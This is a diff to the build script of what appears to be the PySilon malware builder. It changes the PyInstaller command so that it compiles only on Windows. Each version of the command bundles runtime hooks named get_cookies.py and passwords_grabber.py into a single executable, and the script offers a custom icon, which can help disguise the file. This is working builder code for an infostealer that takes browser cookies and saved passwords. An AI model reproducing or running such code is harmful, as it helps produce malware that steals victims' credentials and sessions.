@@ -1,7 +1,5 @@
 import os
-import platform
 import hashlib
-from shutil import copy2
 from tkinter import Tk, filedialog
 
 def get_file_hash(path):
@@ -39,7 +37,7 @@ for setting in settings_prompts:
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
 
-pyinstaller_command = (('start cmd /k "title Building file...' + ' '*240 + '& python ') if platform.system() == 'Windows' else 'python3 ') + 'tools/PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py"' + (' & echo - & echo.Done & echo.- & pause & exit"' if platform.system() == 'Windows' else ';echo -;echo Done;echo -')
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python tools/PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
 with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
